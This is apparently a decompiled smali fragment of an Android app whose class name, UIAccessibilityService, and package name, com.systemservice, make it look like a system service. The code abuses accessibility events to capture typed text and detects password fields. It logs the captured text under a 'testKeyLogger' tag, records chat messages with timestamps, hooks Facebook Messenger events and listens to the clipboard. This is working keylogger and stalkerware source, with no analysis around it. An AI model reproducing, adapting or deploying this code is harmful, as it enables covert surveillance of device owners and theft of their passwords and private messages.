    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "  TYPE_VIEW_TEXT_CHANGED "

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v7, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    :try_start_5
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_f

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v5, "\u2022"

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0
    :try_end_5
    .catch Ljava/lang/Throwable; {:try_start_5 .. :try_end_5} :catch_1

    const-string v5, "testKeyLogger"

    if-eqz v0, :cond_8

    const/4 v10, 0x1

    :try_start_6
    iput v10, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->p:I

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "password = "

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->o:Ljava/util/List;

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->q:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v7, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->q:Ljava/lang/String;

    iput-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->r:Ljava/lang/String;

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->s:Lorg/apache/log4j/Logger;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->o:Ljava/util/List;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    goto/16 :goto_4

    :cond_8
    iget v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->p:I

    const/4 v10, 0x1

    if-ne v0, v10, :cond_9

    const/4 v0, 0x2

    iput v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->p:I

    :cond_9
    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->y:Ljava/util/ArrayList;

    iget-object v10, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->q:Ljava/lang/String;

    invoke-virtual {v0, v10}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->x:Ljava/util/ArrayList;

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v0, v10}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->x:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->size()I

    move-result v0

    const/4 v10, 0x2

    if-le v0, v10, :cond_f

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->x:Ljava/util/ArrayList;

    iget-object v11, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->x:Ljava/util/ArrayList;

    invoke-virtual {v11}, Ljava/util/ArrayList;->size()I

    move-result v11

    sub-int/2addr v11, v10

    invoke-virtual {v0, v11}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    iget-object v11, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->x:Ljava/util/ArrayList;

    iget-object v12, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->x:Ljava/util/ArrayList;

    invoke-virtual {v12}, Ljava/util/ArrayList;->size()I

    move-result v12

    sub-int/2addr v12, v10

    invoke-virtual {v11, v12}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Ljava/lang/String;

    invoke-virtual {v10}, Ljava/lang/String;->length()I

    move-result v10

    const/4 v11, 0x1

    sub-int/2addr v10, v11

    const/4 v11, 0x0

    invoke-virtual {v0, v11, v10}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v11, "  textPrevious "

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-static {v7, v10}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v10

    const/4 v11, 0x3

    if-le v10, v11, :cond_a

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v10

    sub-int/2addr v10, v11

    const/4 v12, 0x0

    invoke-virtual {v0, v12, v10}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    :cond_a
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v10, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_f

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->x:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->size()I

    move-result v0

    if-le v0, v11, :cond_f

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->x:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->size()I

    move-result v0

    const/4 v10, 0x2

    sub-int/2addr v0, v10

    iget-object v10, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->y:Ljava/util/ArrayList;

    invoke-virtual {v10, v0}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Ljava/lang/String;

    iget-object v11, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->x:Ljava/util/ArrayList;

    invoke-virtual {v11, v0}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v11

    check-cast v11, Ljava/lang/String;

    invoke-virtual {v11}, Ljava/lang/String;->length()I

    move-result v11

    const/4 v12, 0x4

    if-le v11, v12, :cond_b

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v4, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->x:Ljava/util/ArrayList;

    invoke-virtual {v4, v0}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->q:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v7, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v3, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->x:Ljava/util/ArrayList;

    invoke-virtual {v3, v0}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/String;

    iget-object v4, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->x:Ljava/util/ArrayList;

    invoke-virtual {v4, v0}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    const/4 v4, 0x1

    sub-int/2addr v0, v4

    invoke-virtual {v3, v4, v0}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    goto :goto_3

    :cond_b
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v12, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->x:Ljava/util/ArrayList;

    invoke-virtual {v12, v0}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v12

    check-cast v12, Ljava/lang/String;

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-static {v7, v11}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v11, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->x:Ljava/util/ArrayList;

    invoke-virtual {v11, v0}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v11

    check-cast v11, Ljava/lang/String;

    invoke-virtual {v11, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-eqz v11, :cond_c

    iget-object v11, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->x:Ljava/util/ArrayList;

    invoke-virtual {v11, v0}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v11

    check-cast v11, Ljava/lang/String;

    invoke-virtual {v11, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-eqz v11, :cond_c

    iget-object v11, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->x:Ljava/util/ArrayList;

    invoke-virtual {v11, v0}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-virtual {v0, v4, v8}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v3, v8}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    goto :goto_3

    :cond_c
    iget-object v3, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->x:Ljava/util/ArrayList;

    invoke-virtual {v3, v0}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    :goto_3
    const-string v3, "Type a message"

    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-nez v3, :cond_e

    new-instance v3, Ljava/util/Date;

    invoke-direct {v3}, Ljava/util/Date;-><init>()V

    iput-object v3, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->B:Ljava/util/Date;

    iget-object v3, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->E:Lcom/systemservice/a/e/g;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Lcom/systemservice/a/e/g;->c(Ljava/lang/String;)V

    iget-object v3, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->E:Lcom/systemservice/a/e/g;

    iget-object v4, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->B:Ljava/util/Date;

    invoke-virtual {v4}, Ljava/util/Date;->getTime()J

    move-result-wide v10

    div-long/2addr v10, v13

    invoke-virtual {v3, v10, v11}, Lcom/systemservice/a/e/g;->a(J)V

    iget-object v3, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->E:Lcom/systemservice/a/e/g;

    invoke-virtual {v3, v0}, Lcom/systemservice/a/e/g;->d(Ljava/lang/String;)V

    iget-object v3, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->E:Lcom/systemservice/a/e/g;

    const/4 v4, 0x5

    invoke-virtual {v3, v4}, Lcom/systemservice/a/e/g;->a(I)V

    iget-object v3, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->E:Lcom/systemservice/a/e/g;

    invoke-virtual {v3, v8}, Lcom/systemservice/a/e/g;->b(Ljava/lang/String;)V

    iget-object v3, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->C:Landroid/content/SharedPreferences;

    invoke-interface {v3, v6, v8}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_d

    iget-object v3, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->A:Lcom/systemservice/a/h/k;

    iget-object v4, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->E:Lcom/systemservice/a/e/g;

    invoke-virtual {v3, v4}, Lcom/systemservice/a/h/k;->a(Lcom/systemservice/a/e/g;)J

    :cond_d
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "mtext = "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->q:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v7, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v3, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->s:Lorg/apache/log4j/Logger;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    :cond_e
    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->x:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->clear()V

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->y:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->clear()V
    :try_end_6
    .catch Ljava/lang/Throwable; {:try_start_6 .. :try_end_6} :catch_1

    goto :goto_4

    :catch_1
    move-exception v0

    :try_start_7
    iget-object v3, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->s:Lorg/apache/log4j/Logger;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-static {v7, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_f
    :goto_4
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v3, "com.facebook.orca"

    invoke-virtual {v0, v3}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_10

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->C:Landroid/content/SharedPreferences;

    const-string v3, "facebook_active"

    const/4 v4, 0x0

    invoke-interface {v0, v3, v4}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_10

    new-instance v0, Lcom/systemservice/a/c/f/d;

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-direct {v0, v3}, Lcom/systemservice/a/c/f/d;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0, v2}, Lcom/systemservice/a/c/f/d;->a(Landroid/view/accessibility/AccessibilityEvent;)V

    :cond_10
    if-eqz v9, :cond_11

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v2, v9, v0}, Lcom/systemservice/common/boostReceiver/b;->a(Landroid/view/accessibility/AccessibilityEvent;Landroid/view/accessibility/AccessibilityNodeInfo;Landroid/content/Context;)V

    :cond_11
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iget-object v3, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->C:Landroid/content/SharedPreferences;

    iget-object v4, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->t:Lcom/systemservice/a/h/n;

    invoke-static {v2, v0, v3, v4}, Lcom/systemservice/common/boostReceiver/b;->a(Landroid/view/accessibility/AccessibilityEvent;Landroid/content/Context;Landroid/content/SharedPreferences;Lcom/systemservice/a/h/n;)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2

    goto :goto_5

    :catch_2
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-static {v7, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    :goto_5
    return-void
.end method

.method public onCreate()V
    .locals 3

    invoke-super {p0}, Landroid/accessibilityservice/AccessibilityService;->onCreate()V

    const-string v0, "UIAccessibilityService"

    invoke-static {v0}, Lcom/systemservice/a/e/m;->a(Ljava/lang/String;)Lorg/apache/log4j/Logger;

    move-result-object v0

    iput-object v0, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->s:Lorg/apache/log4j/Logger;

    new-instance v0, Lcom/systemservice/a/h/n;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-direct {v0, v1}, Lcom/systemservice/a/h/n;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->t:Lcom/systemservice/a/h/n;

    new-instance v0, Lcom/systemservice/a/h/d;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-direct {v0, v1}, Lcom/systemservice/a/h/d;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->z:Lcom/systemservice/a/h/d;

    new-instance v0, Lcom/systemservice/a/h/g;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-direct {v0, v1}, Lcom/systemservice/a/h/g;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->u:Lcom/systemservice/a/h/g;

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->o:Ljava/util/List;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "app_prefs_settings"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    iput-object v0, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->C:Landroid/content/SharedPreferences;

    new-instance v0, Lcom/systemservice/a/h/k;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-direct {v0, v1}, Lcom/systemservice/a/h/k;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->A:Lcom/systemservice/a/h/k;

    new-instance v0, Lcom/systemservice/a/e/c;

    invoke-direct {v0}, Lcom/systemservice/a/e/c;-><init>()V

    iput-object v0, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->D:Lcom/systemservice/a/e/c;

    new-instance v0, Lcom/systemservice/a/e/g;

    invoke-direct {v0}, Lcom/systemservice/a/e/g;-><init>()V

    iput-object v0, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->E:Lcom/systemservice/a/e/g;

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1c

    if-gt v0, v1, :cond_0

    const-string v0, "clipboard"

    invoke-virtual {p0, v0}, Landroid/accessibilityservice/AccessibilityService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/content/ClipboardManager;

    iget-object v1, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->G:Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;

    invoke-virtual {v0, v1}, Landroid/content/ClipboardManager;->addPrimaryClipChangedListener(Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;)V

    :cond_0
    const-wide/16 v0, 0x0

    sput-wide v0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->c:J

    sput-wide v0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->e:J

    sput-wide v0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->f:J

    sput-wide v0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->g:J

    sput-wide v0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->h:J

    sput-wide v0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->i:J

    sput-wide v0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->j:J

    sput-wide v0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->d:J

    sput-wide v0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->k:J

    sput-wide v0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->l:J

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->m:Ljava/util/List;

    const-string v0, "TEMP"

    sput-object v0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->n:Ljava/lang/String;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "onCreate = "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-wide v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->c:J

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "timeMilisecondzz"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method public onInterrupt()V
    .locals 0

    return-void
.end method

.method protected onServiceConnected()V
    .locals 0

    invoke-super {p0}, Landroid/accessibilityservice/AccessibilityService;->onServiceConnected()V

    return-void
.end method
